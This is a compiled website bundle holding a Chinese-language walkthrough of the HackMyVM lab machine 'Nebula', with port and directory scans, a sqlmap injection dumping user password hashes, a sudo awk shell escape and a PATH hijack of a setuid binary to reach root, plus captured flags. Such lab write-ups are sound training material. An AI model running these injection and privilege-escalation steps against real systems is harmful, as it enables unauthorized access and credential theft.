"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[5918],{21697:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>h,frontMatter:()=>l,metadata:()=>r,toc:()=>i});const r=JSON.parse('{"id":"HackMyVM/Machines/Nebula/index","title":"Nebula","description":"[Linux VM] [Tested on VirtualBox and VMWare.] created by || Kretinga","source":"@site/docs/HackMyVM/Machines/Nebula/index.md","sourceDirName":"HackMyVM/Machines/Nebula","slug":"/HackMyVM/Machines/Nebula/","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Nebula/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Nebula/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVM_Sidebar","previous":{"title":"Moosage","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Moosage/"},"next":{"title":"Orasi","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Orasi/"}}');var s=a(74848),t=a(28453);const l={},o="Nebula",c={},i=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"\u641c\u7d22\u529f\u80fd\u5b58\u5728 sql \u6ce8\u5165",id:"\u641c\u7d22\u529f\u80fd\u5b58\u5728-sql-\u6ce8\u5165",level:3},{value:"User - pmccentral",id:"user---pmccentral",level:2},{value:"\u8bfb\u53d6\u547d\u4ee4\u884c\u5386\u53f2",id:"\u8bfb\u53d6\u547d\u4ee4\u884c\u5386\u53f2",level:3},{value:"\u5c1d\u8bd5\u63d0\u6743",id:"\u5c1d\u8bd5\u63d0\u6743",level:3},{value:"User - laboratoryadmin",id:"user---laboratoryadmin",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u5c1d\u8bd5\u63d0\u6743",id:"\u5c1d\u8bd5\u63d0\u6743-1",level:3},{value:"\u7a0b\u5e8f\u9006\u5411\u5206\u6790",id:"\u7a0b\u5e8f\u9006\u5411\u5206\u6790",level:2},{value:"PMCEmployees",id:"pmcemployees",level:3},{value:"head \u6587\u4ef6\u5206\u6790",id:"head-\u6587\u4ef6\u5206\u6790",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"nebula",children:"Nebula"})}),"\n",(0,s.jsxs)(n.admonition,{type:"note",children:[(0,s.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox and VMWare.] created by || Kretinga"}),(0,s.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2024-01-02"}),(0,s.jsx)(n.p,{children:"\u2714\ufe0f MD5 // e776777fb487bea62da80840b03c8fe6"}),(0,s.jsx)(n.p,{children:"\u2620 Root // 70"}),(0,s.jsx)(n.p,{children:"\ud83d\udc80 User // 68"}),(0,s.jsx)(n.p,{children:"\ud83d\udcddNotes //\nEnjoy."})]}),"\n",(0,s.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,s.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.108\n"})}),"\n",(0,s.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.108\nHost is up (0.00049s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 63:9c:2e:57:91:af:1e:2e:25:ba:55:fd:ba:48:a8:60 (RSA)\n|   256 d0:05:24:1d:a8:99:0e:d6:d1:e5:c5:5b:40:6a:b9:f9 (ECDSA)\n|_  256 d8:4a:b8:86:9d:66:6d:7f:a4:cb:d0:73:a1:f4:b5:19 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Nebula Lexus Labs\n"})}),"\n",(0,s.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u76ee\u5f55\u7206\u7834"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[\u2717]\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $feroxbuster -u http://192.168.56.108 -w /usr/share/wordlists/seclists//Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben "epi" Risher \ud83e\udd13                 ver: 2.10.1\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://192.168.56.108\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/wordlists/seclists//Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n \ud83d\udc4c  Status Codes          \u2502 All Status Codes!\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.10.1\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n301      GET        9l       28w      314c http://192.168.56.108/img => http://192.168.56.108/img/\n301      GET        9l       28w      316c http://192.168.56.108/login => http://192.168.56.108/login/\n200      GET      117l      627w    49089c http://192.168.56.108/img/image1\n200      GET     1121l     5980w   469563c http://192.168.56.108/img/image2\n200      GET       76l      291w     3479c http://192.168.56.108/\n301      GET        9l       28w      317c http://192.168.56.108/joinus => http://192.168.56.108/joinus/\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u5bf9 ",(0,s.jsx)(n.code,{children:"http://192.168.56.108/joinus/"})," \u8fd9\u4e2a\u8def\u5f84\u8fdb\u884c\u63a2\u6d4b\uff0c\u53d1\u73b0\u4ee5\u4e0b\u4fe1\u606f"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="http://192.168.56.108/joinus/application_form.pdf"',children:"https://nebulalabs.org/meetings?user=admin&password=d46df8e6a5627debf930f7b5c8f3b083\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5f97\u5230\u4ee5\u4e0b\u51ed\u636e"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"admin:d46df8e6a5627debf930f7b5c8f3b083\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6210\u529f\u767b\u9646\u540e\u53f0"}),"\n",(0,s.jsx)(n.h3,{id:"\u641c\u7d22\u529f\u80fd\u5b58\u5728-sql-\u6ce8\u5165",children:"\u641c\u7d22\u529f\u80fd\u5b58\u5728 sql \u6ce8\u5165"}),"\n",(0,s.jsx)(n.p,{children:"\u5bf9\u6d4f\u89c8\u5668\u7684\u8bbf\u95ee\u8bf7\u6c42\u8fdb\u884c\u6293\u5305"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"GET /login/search_central.php?id=1 HTTP/1.1\nHost: 192.168.56.108\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: keep-alive\nReferer: http://192.168.56.108/login/search_central.php?id=1\nCookie: PHPSESSID=p8mg4vbtsjc4iahtr48g4koi76\nUpgrade-Insecure-Requests: 1\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5c06\u539f\u59cb\u8bf7\u6c42\u7684\u6570\u636e\u4fdd\u5b58\u4e3a ",(0,s.jsx)(n.code,{children:"sqlmap.txt"})," \u6587\u4ef6\uff0c\u8fdb\u884c\u81ea\u52a8\u5316\u653b\u51fb"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $sqlmap -r sqlmap.txt --dbs\n......\n[*] information_schema\n[*] nebuladb\n\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $sqlmap -r sqlmap.txt -D nebuladb --tables\n......\n+----------+\n| central  |\n| centrals |\n| users    |\n+----------+\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c06\u6570\u636e\u5e93\u7684\u6570\u636e dump \u4e0b\u6765"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"Database: nebuladb\nTable: users\n[7 entries]\n+----+----------+----------------------------------------------+-------------+\n| id | is_admin | password                                     | username    |\n+----+----------+----------------------------------------------+-------------+\n| 1  | 1        | d46df8e6a5627debf930f7b5c8f3b083             | admin       |\n| 2  | 0        | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |\n| 3  | 0        | 5f823f1ac7c9767c8d1efbf44158e0ea             | Frederick   |\n| 3  | 0        | 4c6dda8a9d149332541e577b53e2a3ea             | Samuel      |\n| 5  | 0        | 41ae0e6fbe90c08a63217fc964b12903             | Mary        |\n| 6  | 0        | 5d8cdc88039d5fc021880f9af4f7c5c3             | hecolivares |\n| 7  | 1        | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |\n+----+----------+----------------------------------------------+-------------+\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5f97\u5230\u4e00\u7ec4\u51ed\u636e"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"pmccentral:999999999\n"})}),"\n",(0,s.jsx)(n.h2,{id:"user---pmccentral",children:"User - pmccentral"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $pwncat-cs pmccentral@192.168.56.108\n[19:46:46] Welcome to pwncat \ud83d\udc08!\nPassword: *********\n[19:46:50] 192.168.56.108:22: registered new host w/ db\n(local) pwncat$ back\n(remote) pmccentral@laboratoryuser:/home/pmccentral$ whoami\npmccentral\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u8bfb\u53d6\u547d\u4ee4\u884c\u5386\u53f2",children:"\u8bfb\u53d6\u547d\u4ee4\u884c\u5386\u53f2"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="/home/pmccentral/.bash_history"',children:"ls\ncd laboratoryuser/\nsudo su\ncd pmccentral/\nls\nnano\nls\nmkdir desktop downloads documents\nls\nll\nexit\nls\ntree\nls\nls desktop/k\nls desktop/\nls documents/\nls\nls downloads/\ncd documents/\nls\ncat employees.txt\ncd ..\nls\ncd laboratoryadmin/\nls\ncd autoScripts/\nls\nwhoami\nll\nls\ncd ..\nls\nexit\nls\ncd documents/\nexit\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u5c1d\u8bd5\u63d0\u6743",children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="sudo -l"',children:"(remote) pmccentral@laboratoryuser:/home/pmccentral$ sudo -l\n[sudo] password for pmccentral:\nMatching Defaults entries for pmccentral on laboratoryuser:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser pmccentral may run the following commands on laboratoryuser:\n    (laboratoryadmin) /usr/bin/awk\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u5229\u7528 awk \u5b9e\u73b0\u63d0\u6743"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"sudo -u laboratoryadmin /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}'\n"})}),"\n",(0,s.jsx)(n.h2,{id:"user---laboratoryadmin",children:"User - laboratoryadmin"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"laboratoryadmin@laboratoryuser:/home/pmccentral$ whoami\nlaboratoryadmin\n"})}),"\n",(0,s.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"laboratoryadmin@laboratoryuser:~$ cat user.txt\nflag{$udOeR$_Pr!V11E9E_I5_7En53}\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u5c1d\u8bd5\u63d0\u6743-1",children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,s.jsx)(n.p,{children:"\u5bf9\u7528\u6237\u76ee\u5f55\u8fdb\u884c\u63a2\u6d4b"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"laboratoryadmin@laboratoryuser:~/autoScripts$ pwd;ls -lah\n/home/laboratoryadmin/autoScripts\ntotal 32K\ndrwxr-xr-x 2 laboratoryadmin laboratoryadmin 4.0K Dec 18 20:16 .\ndrwx------ 8 laboratoryadmin laboratoryadmin 4.0K Dec 18 16:15 ..\n-rwxrwxr-x 1 laboratoryadmin laboratoryadmin    8 Dec 18 20:16 head\n-rwsr-xr-x 1 root            root             17K Dec 17 15:40 PMCEmployees\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c06\u4e24\u4e2a\u7a0b\u5e8f\u90fd\u4e0b\u8f7d\u5230\u672c\u5730\u8fdb\u884c\u5206\u6790"}),"\n",(0,s.jsx)(n.h2,{id:"\u7a0b\u5e8f\u9006\u5411\u5206\u6790",children:"\u7a0b\u5e8f\u9006\u5411\u5206\u6790"}),"\n",(0,s.jsx)(n.h3,{id:"pmcemployees",children:"PMCEmployees"}),"\n",(0,s.jsx)(n.p,{children:"\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u53cd\u7f16\u8bd1"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'int __fastcall main(int argc, const char **argv, const char **envp)\n{\n  setuid(0);\n  printf("Showing top 10 best employees of PMC company");\n  return system("head /home/pmccentral/documents/employees.txt");\n}\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u5e76\u4e14\u53ef\u4ee5\u6ce8\u610f\u5230 ",(0,s.jsx)(n.code,{children:"/home/laboratoryadmin/autoScripts/head"})," \u8fd9\u4e2a\u6587\u4ef6\u662f\u53ef\u63a7\u7684\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a5\u7ba1\u6743\u9650\u4e86"]}),"\n",(0,s.jsx)(n.h3,{id:"head-\u6587\u4ef6\u5206\u6790",children:"head \u6587\u4ef6\u5206\u6790"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="/home/laboratoryadmin/autoScripts/head"',children:"bash -p\n"})}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"\u597d\u5947\u602a\uff0c\u8fd9\u4e2a\u9776\u673a\u7684\u4f5c\u8005\u8fd9\u662f\u76f4\u63a5\u628a\u63d0\u6743\u65b9\u6848\u76f4\u63a5\u5f80\u5634\u5df4\u91cc\u9762\u5582\uff1f"})}),"\n",(0,s.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"\u4e0b\u9762\u7684\u65b9\u6848\u66b4\u529b\u4fee\u6539\u4e86 PATH \u73af\u5883\u53d8\u91cf\uff0c\u4e0d\u5efa\u8bae\u4f7f\u7528\u6b64\u65b9\u6848"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"laboratoryadmin@laboratoryuser:~/autoScripts$ echo '/usr/bin/bash -p' > head\nlaboratoryadmin@laboratoryuser:~/autoScripts$ export PATH=/home/laboratoryadmin/autoScripts\nlaboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees\nroot@laboratoryuser:~/autoScripts# /usr/bin/whoami\nroot\n"})}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"\u5efa\u8bae\u4f7f\u7528\u6b64\u65b9\u6848"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) laboratoryadmin@laboratoryuser:/home/laboratoryadmin/autoScripts$ export PATH=/home/laboratoryadmin/autoScripts:$PATH\n(remote) laboratoryadmin@laboratoryuser:/home/laboratoryadmin/autoScripts$ ./PMCEmployees\nroot@laboratoryuser:~/autoScripts# whoami\nroot\n"})}),"\n",(0,s.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@laboratoryuser:/root# cat root.txt\nflag{r00t_t3ns0}\n"})})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},28453:(e,n,a)=>{a.d(n,{R:()=>l,x:()=>o});var r=a(96540);const s={},t=r.createContext(s);function l(e){const n=r.useContext(t);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:l(e.components),r.createElement(t.Provider,{value:n},e.children)}}}]);